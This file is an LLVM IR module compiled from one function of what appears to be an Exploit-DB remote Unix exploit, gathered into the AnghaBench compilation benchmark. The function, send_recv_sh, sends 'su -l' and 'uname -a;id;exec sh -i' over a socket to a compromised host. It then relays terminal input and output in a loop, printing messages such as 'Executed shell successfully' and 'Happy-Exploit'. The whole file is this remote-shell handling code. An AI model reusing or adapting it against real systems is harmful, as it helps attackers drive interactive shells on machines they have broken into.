; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22468.c_send_recv_sh.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22468.c_send_recv_sh.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32, i64 }

@.str = private unnamed_addr constant [7 x i8] c"su -l\0A\00", align 1
@.str.1 = private unnamed_addr constant [24 x i8] c"uname -a;id;exec sh -i\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [36 x i8] c" [*] Executed shell successfully !\0A\00", align 1
@.str.3 = private unnamed_addr constant [50 x i8] c" [*] Command: # su -l; uname -a; id; exec sh -i\0A\0A\00", align 1
@STDIN_FILENO = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [21 x i8] c" [*] Happy-Exploit\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @send_recv_sh(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.timeval, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1024 x i8], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** %5, align 8
  store i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0), i8** %6, align 8
  %9 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %10 = call i32 @memset(i8* %9, i32 0, i32 1024)
  %11 = load i32, i32* @stdout, align 4
  %12 = call i32 (i32, i8*, ...) @fprintf(i32 %11, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i64 0, i64 0))
  %13 = load i32, i32* @stdout, align 4
  %14 = call i32 (i32, i8*, ...) @fprintf(i32 %13, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.3, i64 0, i64 0))
  %15 = load i32, i32* %2, align 4
  %16 = load i8*, i8** %5, align 8
  %17 = load i8*, i8** %5, align 8
  %18 = call i32 @strlen(i8* %17)
  %19 = call i32 @send(i32 %15, i8* %16, i32 %18, i32 0)
  %20 = load i32, i32* %2, align 4
  %21 = load i8*, i8** %6, align 8
  %22 = load i8*, i8** %6, align 8
  %23 = call i32 @strlen(i8* %22)
  %24 = call i32 @send(i32 %20, i8* %21, i32 %23, i32 0)
  %25 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i32 0, i32 0
  store i32 10, i32* %25, align 8
  %26 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i32 0, i32 1
  store i64 0, i64* %26, align 8
  br label %27

27:                                               ; preds = %1, %79
  %28 = load i32, i32* @stdout, align 4
  %29 = call i32 @fflush(i32 %28)
  %30 = call i32 @FD_ZERO(i32* %8)
  %31 = load i32, i32* %2, align 4
  %32 = call i32 @FD_SET(i32 %31, i32* %8)
  %33 = load i32, i32* @STDIN_FILENO, align 4
  %34 = call i32 @FD_SET(i32 %33, i32* %8)
  %35 = load i32, i32* %2, align 4
  %36 = add nsw i32 %35, 1
  %37 = call i32 @select(i32 %36, i32* %8, i32* null, i32* null, %struct.timeval* %4)
  %38 = load i32, i32* %2, align 4
  %39 = call i64 @FD_ISSET(i32 %38, i32* %8)
  %40 = icmp ne i64 %39, 0
  br i1 %40, label %41, label %60

41:                                               ; preds = %27
  %42 = load i32, i32* %2, align 4
  %43 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %44 = call i32 @read(i32 %42, i8* %43, i32 1023)
  store i32 %44, i32* %3, align 4
  %45 = load i32, i32* %3, align 4
  %46 = icmp sle i32 %45, 0
  br i1 %46, label %47, label %53

47:                                               ; preds = %41
  %48 = load i32, i32* @stdout, align 4
  %49 = call i32 (i32, i8*, ...) @fprintf(i32 %48, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0))
  %50 = load i32, i32* %2, align 4
  %51 = call i32 @close(i32 %50)
  %52 = call i32 @exit(i32 0) #3
  unreachable

53:                                               ; preds = %41
  %54 = load i32, i32* %3, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %55
  store i8 0, i8* %56, align 1
  %57 = load i32, i32* @stdout, align 4
  %58 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %59 = call i32 (i32, i8*, ...) @fprintf(i32 %57, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i8* %58)
  br label %60

60:                                               ; preds = %53, %27
  %61 = load i32, i32* @STDIN_FILENO, align 4
  %62 = call i64 @FD_ISSET(i32 %61, i32* %8)
  %63 = icmp ne i64 %62, 0
  br i1 %63, label %64, label %79

64:                                               ; preds = %60
  %65 = load i32, i32* @STDIN_FILENO, align 4
  %66 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %67 = call i32 @read(i32 %65, i8* %66, i32 1023)
  store i32 %67, i32* %3, align 4
  %68 = load i32, i32* %3, align 4
  %69 = icmp sgt i32 %68, 0
  br i1 %69, label %70, label %78

70:                                               ; preds = %64
  %71 = load i32, i32* %3, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %72
  store i8 0, i8* %73, align 1
  %74 = load i32, i32* %2, align 4
  %75 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %76 = load i32, i32* %3, align 4
  %77 = call i32 @write(i32 %74, i8* %75, i32 %76)
  br label %78

78:                                               ; preds = %70, %64
  br label %79

79:                                               ; preds = %78, %60
  br label %27
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, %struct.timeval*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @write(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
